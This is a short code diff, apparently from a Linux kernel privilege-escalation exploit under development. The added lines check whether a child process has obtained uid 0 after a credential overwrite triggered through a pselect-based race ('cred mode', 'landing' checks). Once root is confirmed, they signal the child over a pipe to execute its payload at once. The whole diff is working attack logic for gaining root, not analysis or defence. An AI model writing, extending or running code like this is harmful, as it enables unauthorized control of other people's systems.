@@ -2013,9 +2013,18 @@ void do_pselect_fake_lock_route(void) {
            * reached their landing checks (08-30 fire). Same checked
            * retry here before deciding. */
           int canary = env_flag("UID0_COMM_CANARY", 0);
+          uint32_t cq = cred_mode ? uid0_child_getuid_query() : 9999;
+          if (cred_mode)
+            pr_info("child uid query attempt=%d -> %u\n", route_attempt, cq);
           int landed = canary ? uid0_child_comm_landed()
-                              : (cred_mode ? uid0_payload_fired()
+                              : (cred_mode ? (cq == 0 || uid0_payload_fired())
                                            : bootid_changed());
+          if (cred_mode && cq == 0) {
+            /* cred LANDED: send G so the child execs the payload NOW */
+            char g = 'G';
+            if (g_uid0_cmd_w >= 0)
+              (void)write(g_uid0_cmd_w, &g, 1);
+          }
           if (landed)
             uid0_log_landing_signals("landing signals");
           if (landed) {
